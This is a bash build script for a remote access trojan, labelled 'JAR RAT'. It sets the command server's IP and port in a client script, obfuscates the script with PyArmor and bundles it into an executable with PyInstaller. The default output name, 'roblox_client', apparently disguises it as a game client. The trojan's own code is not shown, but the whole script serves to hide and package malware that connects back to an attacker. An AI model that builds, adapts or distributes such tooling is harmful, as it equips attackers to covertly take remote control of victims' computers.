#!/usr/bin/env bash

set -e

VENV_DIR="venv"
OBFUSCATED_DIR="obfuscated_client"
CLIENT_SCRIPT="client.py"
TEMP_CLIENT_SCRIPT="client_temp_build.py"
OUTPUT_NAME="roblox_client"
SPEC_TEMPLATE="client_base.spec"

echo "--- JAR RAT Build Script ---"

echo "[1/10] Cleaning previous build artifacts..."
rm -rf "$VENV_DIR" "$OBFUSCATED_DIR" dist/ build/ "$TEMP_CLIENT_SCRIPT" "$SPEC_FILE"
echo "Cleaned."

echo "--- Client Configuration ---"
read -p "Enter Server IP (default: 127.0.0.1): " USER_SERVER_IP
if [ -z "$USER_SERVER_IP" ]; then
    USER_SERVER_IP="127.0.0.1"
fi

read -p "Enter Server Port (default: 9999): " USER_SERVER_PORT
if [ -z "$USER_SERVER_PORT" ]; then
    USER_SERVER_PORT="9999"
fi
echo "Client will connect to: $USER_SERVER_IP:$USER_SERVER_PORT"
echo "----------------------------"

echo "--- Output Executable Configuration ---"
read -p "Enter desired output executable name (default: client_obf): " USER_OUTPUT_NAME
if [ -z "$USER_OUTPUT_NAME" ]; then
    OUTPUT_NAME="client_obf"
else
    OUTPUT_NAME="$USER_OUTPUT_NAME"
fi
echo "Output executable will be named: $OUTPUT_NAME"
echo "-------------------------------------"

SPEC_FILE="${OUTPUT_NAME}.spec"
FINAL_EXECUTABLE="dist/$OUTPUT_NAME"
PYTHON_BIN="python3"

echo "[2/10] Creating virtual environment..."
"$PYTHON_BIN" -m venv "$VENV_DIR"
echo "Activating virtual environment..."
source "$VENV_DIR/bin/activate"
echo "Virtual environment created and activated."

echo "[3/10] Installing Python dependencies (pyinstaller, pyarmor.cli, requests, colorama, python-dotenv)..."
pip install pyinstaller pyarmor.cli requests colorama python-dotenv
echo "Dependencies installed."

echo "[4/10] Substituting IP/Port into temporary client script..."
cp "$CLIENT_SCRIPT" "$TEMP_CLIENT_SCRIPT"

sed -i "s|DEFAULT_SERVER_IP = \"SERVER_IP_PLACEHOLDER\"|DEFAULT_SERVER_IP = \"${USER_SERVER_IP}\"|g" "$TEMP_CLIENT_SCRIPT"
sed -i "s|DEFAULT_SERVER_PORT = SERVER_PORT_PLACEHOLDER|DEFAULT_SERVER_PORT = ${USER_SERVER_PORT}|g" "$TEMP_CLIENT_SCRIPT"
echo "Temporary client script created: '$TEMP_CLIENT_SCRIPT' with custom IP/Port."

echo "[5/10] Obfuscating client script with PyArmor ($TEMP_CLIENT_SCRIPT)..."
pyarmor gen --output "$OBFUSCATED_DIR" "$TEMP_CLIENT_SCRIPT"
echo "Client script obfuscated."

echo "[6/10] Locating PyArmor runtime folder within '$OBFUSCATED_DIR'..."
PYARMOR_RUNTIME_FOLDER=$(find "$OBFUSCATED_DIR" -maxdepth 1 -type d -name "pyarmor_runtime_*" -print -quit)

if [ -z "$PYARMOR_RUNTIME_FOLDER" ]; then
    echo "Error: PyArmor runtime folder not found in '$OBFUSCATED_DIR'. PyArmor 'gen' might have failed or generated an unexpected structure. Exiting."
    deactivate
    rm -f "$TEMP_CLIENT_SCRIPT"
    exit 1
fi

PYARMOR_RUNTIME_BASENAME=$(basename "$PYARMOR_RUNTIME_FOLDER")
echo "Found PyArmor runtime: '$PYARMOR_RUNTIME_FOLDER'"

echo "[7/10] Creating PyInstaller .spec file ('$SPEC_FILE') from template ('$SPEC_TEMPLATE')..."

OBFUSCATED_CLIENT_PATH_IN_SPEC="${OBFUSCATED_DIR}/${TEMP_CLIENT_SCRIPT}"
PYARMOR_DATA_SOURCE_IN_SPEC="${OBFUSCATED_DIR}/${PYARMOR_RUNTIME_BASENAME}"

sed -e "s|{{OBFUSCATED_CLIENT_PATH}}|${OBFUSCATED_CLIENT_PATH_IN_SPEC}|g" \
    -e "s|{{PYARMOR_DATA_SOURCE}}|${PYARMOR_DATA_SOURCE_IN_SPEC}|g" \
    -e "s|name='client_obf'|name='${OUTPUT_NAME}'|g" \
    "$SPEC_TEMPLATE" > "$SPEC_FILE"

echo ".spec file created: '$SPEC_FILE'"

echo "[8/10] Building final executable with PyInstaller using '$SPEC_FILE'..."
pyinstaller "$SPEC_FILE"
echo "Executable built in 'dist/' directory."

echo ""
# --- Clear input buffer before the Y/N prompt ---
read -t 0.1 -n 1000000 discard_buffer || true 
# --- End clear input buffer ---

read -p "Do you want to patch the executable for NixOS (y/N)? " -n 1 -r
echo
if [[ "$REPLY" =~ ^[Yy]$ ]]; then
    echo "[9/10] Patching executable for NixOS with patchelf..."
    
    if [ -x "$(command -v patchelf)" ] && [ -d "/nix/store" ] && [ -n "$NIX_CC" ]; then
        NIX_LD_PATH=$(cat "$NIX_CC/nix-support/dynamic-linker")
        
        # Using the 'find' method that worked for you previously
        NIX_LIBC_PATH=$(dirname "$(find -L /nix/store -maxdepth 2 -type f -name "libc.so.6" -print -quit)")
        NIX_ZLIB_PATH=$(dirname "$(find -L /nix/store -maxdepth 3 -type f -name "libz.so.1" -print -quit)")

        if [ -n "$NIX_LD_PATH" ] && [ -n "$NIX_LIBC_PATH" ] && [ -n "$NIX_ZLIB_PATH" ] && [ -f "$FINAL_EXECUTABLE" ]; then
            patchelf \
                --set-interpreter "$NIX_LD_PATH" \
                --add-rpath "$NIX_LIBC_PATH" \
                --add-rpath "$NIX_ZLIB_PATH" \
                "$FINAL_EXECUTABLE"
            echo "Executable patched successfully for NixOS."
        else
            echo "Warning: Necessary NixOS library paths could not be determined. Patchelf skipped."
            echo "LD Path: $NIX_LD_PATH"
            echo "LibC Path: $NIX_LIBC_PATH"
            echo "ZLib Path: $NIX_ZLIB_PATH"
        fi
    else
        echo "Warning: Not in a NixOS environment (or patchelf/NIX_CC not found). Patchelf skipped."
    fi
else
    echo "NixOS patchelf skipped by user request."
fi

echo "Deactivating virtual environment..."
deactivate

rm -f "$TEMP_CLIENT_SCRIPT" "$SPEC_FILE"

echo "Build process complete!"
echo "Your obfuscated and bundled executable is located at: $FINAL_EXECUTABLE"
